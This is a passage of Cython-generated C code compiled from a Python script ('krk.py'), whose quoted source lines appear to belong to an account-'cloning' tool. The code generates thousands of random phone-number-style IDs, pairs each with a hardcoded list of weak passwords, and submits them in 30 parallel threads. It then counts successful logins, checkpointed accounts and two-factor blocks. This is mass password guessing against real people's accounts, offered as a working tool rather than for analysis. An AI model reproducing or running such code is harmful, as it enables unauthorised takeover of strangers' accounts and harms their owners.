    __Pyx_XGIVEREF(__pyx_t_5);
    __Pyx_XGIVEREF(__pyx_t_6);
    __Pyx_XGIVEREF(__pyx_t_7);
    __Pyx_ExceptionReset(__pyx_t_5, __pyx_t_6, __pyx_t_7);
    __pyx_L8_try_end:;
  }

  /* "krk.py":238
 *                 except ValueError:
 *                         limit = 5000
 *                 for nmbr in range(limit):             # <<<<<<<<<<<<<<
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
 *                         user.append(nmp)
 */
  __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_range, __pyx_v_limit); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 238, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_3);
  if (likely(PyList_CheckExact(__pyx_t_3)) || PyTuple_CheckExact(__pyx_t_3)) {
    __pyx_t_1 = __pyx_t_3; __Pyx_INCREF(__pyx_t_1); __pyx_t_8 = 0;
    __pyx_t_9 = NULL;
  } else {
    __pyx_t_8 = -1; __pyx_t_1 = PyObject_GetIter(__pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 238, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_9 = __Pyx_PyObject_GetIterNextFunc(__pyx_t_1); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 238, __pyx_L1_error)
  }
  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
  for (;;) {
    if (likely(!__pyx_t_9)) {
      if (likely(PyList_CheckExact(__pyx_t_1))) {
        if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyList_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_3); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 238, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 238, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      } else {
        if (__pyx_t_8 >= PyTuple_GET_SIZE(__pyx_t_1)) break;
        #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
        __pyx_t_3 = PyTuple_GET_ITEM(__pyx_t_1, __pyx_t_8); __Pyx_INCREF(__pyx_t_3); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 238, __pyx_L1_error)
        #else
        __pyx_t_3 = PySequence_ITEM(__pyx_t_1, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 238, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
        #endif
      }
    } else {
      __pyx_t_3 = __pyx_t_9(__pyx_t_1);
      if (unlikely(!__pyx_t_3)) {
        PyObject* exc_type = PyErr_Occurred();
        if (exc_type) {
          if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) PyErr_Clear();
          else __PYX_ERR(0, 238, __pyx_L1_error)
        }
        break;
      }
      __Pyx_GOTREF(__pyx_t_3);
    }
    __Pyx_XDECREF_SET(__pyx_v_nmbr, __pyx_t_3);
    __pyx_t_3 = 0;

    /* "krk.py":239
 *                         limit = 5000
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))             # <<<<<<<<<<<<<<
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 */
    __pyx_t_3 = __pyx_pf_3krk_3pak_genexpr(NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 239, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_2 = __Pyx_PyString_Join(__pyx_kp_s__52, __pyx_t_3); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 239, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_XDECREF_SET(__pyx_v_nmp, ((PyObject*)__pyx_t_2));
    __pyx_t_2 = 0;

    /* "krk.py":240
 *                 for nmbr in range(limit):
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
 *                         user.append(nmp)             # <<<<<<<<<<<<<<
 *                 with tred(max_workers=30) as Sabir:
 *                         clear()
 */
    __pyx_t_10 = __Pyx_PyList_Append(__pyx_v_user, __pyx_v_nmp); if (unlikely(__pyx_t_10 == ((int)-1))) __PYX_ERR(0, 240, __pyx_L1_error)

    /* "krk.py":238
 *                 except ValueError:
 *                         limit = 5000
 *                 for nmbr in range(limit):             # <<<<<<<<<<<<<<
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
 *                         user.append(nmp)
 */
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "krk.py":241
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:             # <<<<<<<<<<<<<<
 *                         clear()
 *                         tl = str(len(user))
 */
  /*with:*/ {
    __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_tred); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_2 = __Pyx_PyDict_NewPresized(1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    if (PyDict_SetItem(__pyx_t_2, __pyx_n_s_max_workers, __pyx_int_30) < 0) __PYX_ERR(0, 241, __pyx_L1_error)
    __pyx_t_3 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_empty_tuple, __pyx_t_2); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_7 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_exit_2); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 241, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_7);
    __pyx_t_1 = __Pyx_PyObject_LookupSpecial(__pyx_t_3, __pyx_n_s_enter); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 241, __pyx_L14_error)
    __Pyx_GOTREF(__pyx_t_1);
    __pyx_t_11 = NULL;
    __pyx_t_4 = 0;
    if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
      __pyx_t_11 = PyMethod_GET_SELF(__pyx_t_1);
      if (likely(__pyx_t_11)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
        __Pyx_INCREF(__pyx_t_11);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_1, function);
        __pyx_t_4 = 1;
      }
    }
    {
      PyObject *__pyx_callargs[1] = {__pyx_t_11, };
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 241, __pyx_L14_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
    }
    __pyx_t_1 = __pyx_t_2;
    __pyx_t_2 = 0;
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    /*try:*/ {
      {
        __Pyx_PyThreadState_declare
        __Pyx_PyThreadState_assign
        __Pyx_ExceptionSave(&__pyx_t_6, &__pyx_t_5, &__pyx_t_12);
        __Pyx_XGOTREF(__pyx_t_6);
        __Pyx_XGOTREF(__pyx_t_5);
        __Pyx_XGOTREF(__pyx_t_12);
        /*try:*/ {
          __pyx_v_Sabir = __pyx_t_1;
          __pyx_t_1 = 0;

          /* "krk.py":242
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:
 *                         clear()             # <<<<<<<<<<<<<<
 *                         tl = str(len(user))
 *                         print(' Total account : \033[1;37m'+tl)
 */
          __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_clear); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 242, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_2 = NULL;
          __pyx_t_4 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_3, function);
              __pyx_t_4 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_2, };
            __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_3, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 242, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          }
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":243
 *                 with tred(max_workers=30) as Sabir:
 *                         clear()
 *                         tl = str(len(user))             # <<<<<<<<<<<<<<
 *                         print(' Total account : \033[1;37m'+tl)
 *                         print(f'\033[1;37m Choice code  :\033[1;32m '+code)
 */
          __pyx_t_8 = PyList_GET_SIZE(__pyx_v_user); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 243, __pyx_L18_error)
          __pyx_t_1 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 243, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_Str(__pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 243, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __pyx_v_tl = __pyx_t_3;
          __pyx_t_3 = 0;

          /* "krk.py":244
 *                         clear()
 *                         tl = str(len(user))
 *                         print(' Total account : \033[1;37m'+tl)             # <<<<<<<<<<<<<<
 *                         print(f'\033[1;37m Choice code  :\033[1;32m '+code)
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 */
          __pyx_t_3 = PyNumber_Add(__pyx_kp_s_Total_account_1_37m, __pyx_v_tl); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 244, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __pyx_t_1 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_3); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 244, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

          /* "krk.py":245
 *                         tl = str(len(user))
 *                         print(' Total account : \033[1;37m'+tl)
 *                         print(f'\033[1;37m Choice code  :\033[1;32m '+code)             # <<<<<<<<<<<<<<
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()
 */
          __pyx_t_1 = PyNumber_Add(__pyx_kp_u_1_37m_Choice_code_1_32m, __pyx_v_code); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 245, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_3 = __Pyx_PyObject_CallOneArg(__pyx_builtin_print, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 245, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":246
 *                         print(' Total account : \033[1;37m'+tl)
 *                         print(f'\033[1;37m Choice code  :\033[1;32m '+code)
 *                         print("\x1b[1;93m Please Wait Cloning started...")             # <<<<<<<<<<<<<<
 *                         linex()
 *                         for psx in user:
 */
          __pyx_t_3 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__24, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 246, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_3);
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":247
 *                         print(f'\033[1;37m Choice code  :\033[1;32m '+code)
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()             # <<<<<<<<<<<<<<
 *                         for psx in user:
 *                                 ids = code+psx
 */
          __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_linex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 247, __pyx_L18_error)
          __Pyx_GOTREF(__pyx_t_1);
          __pyx_t_2 = NULL;
          __pyx_t_4 = 0;
          if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
            __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_1);
            if (likely(__pyx_t_2)) {
              PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
              __Pyx_INCREF(__pyx_t_2);
              __Pyx_INCREF(function);
              __Pyx_DECREF_SET(__pyx_t_1, function);
              __pyx_t_4 = 1;
            }
          }
          {
            PyObject *__pyx_callargs[1] = {__pyx_t_2, };
            __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 247, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_3);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":248
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()
 *                         for psx in user:             # <<<<<<<<<<<<<<
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','afghan123','afghan1234','afghan12345','Afghan123','Afghan1234','Afghan12345']
 */
          __pyx_t_3 = __pyx_v_user; __Pyx_INCREF(__pyx_t_3); __pyx_t_8 = 0;
          for (;;) {
            if (__pyx_t_8 >= PyList_GET_SIZE(__pyx_t_3)) break;
            #if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
            __pyx_t_1 = PyList_GET_ITEM(__pyx_t_3, __pyx_t_8); __Pyx_INCREF(__pyx_t_1); __pyx_t_8++; if (unlikely((0 < 0))) __PYX_ERR(0, 248, __pyx_L18_error)
            #else
            __pyx_t_1 = PySequence_ITEM(__pyx_t_3, __pyx_t_8); __pyx_t_8++; if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 248, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            #endif
            __Pyx_XDECREF_SET(__pyx_v_psx, __pyx_t_1);
            __pyx_t_1 = 0;

            /* "krk.py":249
 *                         linex()
 *                         for psx in user:
 *                                 ids = code+psx             # <<<<<<<<<<<<<<
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','afghan123','afghan1234','afghan12345','Afghan123','Afghan1234','Afghan12345']
 *                                 Sabir.submit(rndm,ids,passlist)
 */
            __pyx_t_1 = PyNumber_Add(__pyx_v_code, __pyx_v_psx); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 249, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_XDECREF_SET(__pyx_v_ids, __pyx_t_1);
            __pyx_t_1 = 0;

            /* "krk.py":250
 *                         for psx in user:
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','afghan123','afghan1234','afghan12345','Afghan123','Afghan1234','Afghan12345']             # <<<<<<<<<<<<<<
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')
 */
            __pyx_t_1 = PyList_New(12); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 250, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_INCREF(__pyx_v_psx);
            __Pyx_GIVEREF(__pyx_v_psx);
            PyList_SET_ITEM(__pyx_t_1, 0, __pyx_v_psx);
            __Pyx_INCREF(__pyx_v_ids);
            __Pyx_GIVEREF(__pyx_v_ids);
            PyList_SET_ITEM(__pyx_t_1, 1, __pyx_v_ids);
            __Pyx_INCREF(__pyx_n_s_khankhan);
            __Pyx_GIVEREF(__pyx_n_s_khankhan);
            PyList_SET_ITEM(__pyx_t_1, 2, __pyx_n_s_khankhan);
            __Pyx_INCREF(__pyx_n_s_khan1122);
            __Pyx_GIVEREF(__pyx_n_s_khan1122);
            PyList_SET_ITEM(__pyx_t_1, 3, __pyx_n_s_khan1122);
            __Pyx_INCREF(__pyx_n_s_khan12345);
            __Pyx_GIVEREF(__pyx_n_s_khan12345);
            PyList_SET_ITEM(__pyx_t_1, 4, __pyx_n_s_khan12345);
            __Pyx_INCREF(__pyx_n_s_khan123);
            __Pyx_GIVEREF(__pyx_n_s_khan123);
            PyList_SET_ITEM(__pyx_t_1, 5, __pyx_n_s_khan123);
            __Pyx_INCREF(__pyx_n_s_afghan123);
            __Pyx_GIVEREF(__pyx_n_s_afghan123);
            PyList_SET_ITEM(__pyx_t_1, 6, __pyx_n_s_afghan123);
            __Pyx_INCREF(__pyx_n_s_afghan1234);
            __Pyx_GIVEREF(__pyx_n_s_afghan1234);
            PyList_SET_ITEM(__pyx_t_1, 7, __pyx_n_s_afghan1234);
            __Pyx_INCREF(__pyx_n_s_afghan12345);
            __Pyx_GIVEREF(__pyx_n_s_afghan12345);
            PyList_SET_ITEM(__pyx_t_1, 8, __pyx_n_s_afghan12345);
            __Pyx_INCREF(__pyx_n_s_Afghan123);
            __Pyx_GIVEREF(__pyx_n_s_Afghan123);
            PyList_SET_ITEM(__pyx_t_1, 9, __pyx_n_s_Afghan123);
            __Pyx_INCREF(__pyx_n_s_Afghan1234);
            __Pyx_GIVEREF(__pyx_n_s_Afghan1234);
            PyList_SET_ITEM(__pyx_t_1, 10, __pyx_n_s_Afghan1234);
            __Pyx_INCREF(__pyx_n_s_Afghan12345);
            __Pyx_GIVEREF(__pyx_n_s_Afghan12345);
            PyList_SET_ITEM(__pyx_t_1, 11, __pyx_n_s_Afghan12345);
            __Pyx_XDECREF_SET(__pyx_v_passlist, ((PyObject*)__pyx_t_1));
            __pyx_t_1 = 0;

            /* "krk.py":251
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','afghan123','afghan1234','afghan12345','Afghan123','Afghan1234','Afghan12345']
 *                                 Sabir.submit(rndm,ids,passlist)             # <<<<<<<<<<<<<<
 *                 print('\033[1;37m')
 *                 linex()
 */
            __pyx_t_2 = __Pyx_PyObject_GetAttrStr(__pyx_v_Sabir, __pyx_n_s_submit); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 251, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_2);
            __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_n_s_rndm); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 251, __pyx_L18_error)
            __Pyx_GOTREF(__pyx_t_11);
            __pyx_t_13 = NULL;
            __pyx_t_4 = 0;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_2))) {
              __pyx_t_13 = PyMethod_GET_SELF(__pyx_t_2);
              if (likely(__pyx_t_13)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
                __Pyx_INCREF(__pyx_t_13);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_2, function);
                __pyx_t_4 = 1;
              }
            }
            {
              PyObject *__pyx_callargs[4] = {__pyx_t_13, __pyx_t_11, __pyx_v_ids, __pyx_v_passlist};
              __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 3+__pyx_t_4);
              __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
              __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
              if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 251, __pyx_L18_error)
              __Pyx_GOTREF(__pyx_t_1);
              __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
            }
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

            /* "krk.py":248
 *                         print("\x1b[1;93m Please Wait Cloning started...")
 *                         linex()
 *                         for psx in user:             # <<<<<<<<<<<<<<
 *                                 ids = code+psx
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','afghan123','afghan1234','afghan12345','Afghan123','Afghan1234','Afghan12345']
 */
          }
          __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;

          /* "krk.py":241
 *                         nmp = ''.join(random.choice(string.digits) for _ in range(7))
 *                         user.append(nmp)
 *                 with tred(max_workers=30) as Sabir:             # <<<<<<<<<<<<<<
 *                         clear()
 *                         tl = str(len(user))
 */
        }
        __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
        __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF(__pyx_t_12); __pyx_t_12 = 0;
        goto __pyx_L23_try_end;
        __pyx_L18_error:;
        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;
        __Pyx_XDECREF(__pyx_t_13); __pyx_t_13 = 0;
        __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
        /*except:*/ {
          __Pyx_AddTraceback("krk.pak", __pyx_clineno, __pyx_lineno, __pyx_filename);
          if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_1, &__pyx_t_2) < 0) __PYX_ERR(0, 241, __pyx_L20_except_error)
          __Pyx_XGOTREF(__pyx_t_3);
          __Pyx_XGOTREF(__pyx_t_1);
          __Pyx_XGOTREF(__pyx_t_2);
          __pyx_t_11 = PyTuple_Pack(3, __pyx_t_3, __pyx_t_1, __pyx_t_2); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 241, __pyx_L20_except_error)
          __Pyx_GOTREF(__pyx_t_11);
          __pyx_t_14 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_t_11, NULL);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;
          if (unlikely(!__pyx_t_14)) __PYX_ERR(0, 241, __pyx_L20_except_error)
          __Pyx_GOTREF(__pyx_t_14);
          __pyx_t_15 = __Pyx_PyObject_IsTrue(__pyx_t_14);
          __Pyx_DECREF(__pyx_t_14); __pyx_t_14 = 0;
          if (__pyx_t_15 < 0) __PYX_ERR(0, 241, __pyx_L20_except_error)
          __pyx_t_16 = (!__pyx_t_15);
          if (unlikely(__pyx_t_16)) {
            __Pyx_GIVEREF(__pyx_t_3);
            __Pyx_GIVEREF(__pyx_t_1);
            __Pyx_XGIVEREF(__pyx_t_2);
            __Pyx_ErrRestoreWithState(__pyx_t_3, __pyx_t_1, __pyx_t_2);
            __pyx_t_3 = 0; __pyx_t_1 = 0; __pyx_t_2 = 0; 
            __PYX_ERR(0, 241, __pyx_L20_except_error)
          }
          __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
          __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
          __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
          goto __pyx_L19_exception_handled;
        }
        __pyx_L20_except_error:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_5);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_12);
        goto __pyx_L1_error;
        __pyx_L19_exception_handled:;
        __Pyx_XGIVEREF(__pyx_t_6);
        __Pyx_XGIVEREF(__pyx_t_5);
        __Pyx_XGIVEREF(__pyx_t_12);
        __Pyx_ExceptionReset(__pyx_t_6, __pyx_t_5, __pyx_t_12);
        __pyx_L23_try_end:;
      }
    }
    /*finally:*/ {
      /*normal exit:*/{
        if (__pyx_t_7) {
          __pyx_t_12 = __Pyx_PyObject_Call(__pyx_t_7, __pyx_tuple__26, NULL);
          __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
          if (unlikely(!__pyx_t_12)) __PYX_ERR(0, 241, __pyx_L1_error)
          __Pyx_GOTREF(__pyx_t_12);
          __Pyx_DECREF(__pyx_t_12); __pyx_t_12 = 0;
        }
        goto __pyx_L17;
      }
      __pyx_L17:;
    }
    goto __pyx_L30;
    __pyx_L14_error:;
    __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
    goto __pyx_L1_error;
    __pyx_L30:;
  }

  /* "krk.py":252
 *                                 passlist = [psx,ids,'khankhan','khan1122','khan12345','khan123','afghan123','afghan1234','afghan12345','Afghan123','Afghan1234','Afghan12345']
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')             # <<<<<<<<<<<<<<
 *                 linex()
 *                 print(' The process has completed')
 */
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__27, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 252, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":253
 *                                 Sabir.submit(rndm,ids,passlist)
 *                 print('\033[1;37m')
 *                 linex()             # <<<<<<<<<<<<<<
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 */
  __Pyx_GetModuleGlobalName(__pyx_t_1, __pyx_n_s_linex); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 253, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_1))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_1, function);
      __pyx_t_4 = 1;
    }
  }
  {
    PyObject *__pyx_callargs[1] = {__pyx_t_3, };
    __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_1, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 253, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
  }
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":254
 *                 print('\033[1;37m')
 *                 linex()
 *                 print(' The process has completed')             # <<<<<<<<<<<<<<
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))
 *                 linex()
 */
  __pyx_t_2 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__28, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 254, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;

  /* "krk.py":255
 *                 linex()
 *                 print(' The process has completed')
 *                 print(' Total OK/CP/2F: '+str(len(oks))+'/'+str(len(cps))+'/'+str(len(twf)))             # <<<<<<<<<<<<<<
 *                 linex()
 *                 input(' Press enter to back ')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_oks); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_8 = PyObject_Length(__pyx_t_2); if (unlikely(__pyx_t_8 == ((Py_ssize_t)-1))) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyInt_FromSsize_t(__pyx_t_8); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_1 = __Pyx_PyObject_Str(__pyx_t_2); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  __pyx_t_2 = PyNumber_Add(__pyx_kp_s_Total_OK_CP_2F, __pyx_t_1); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 255, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
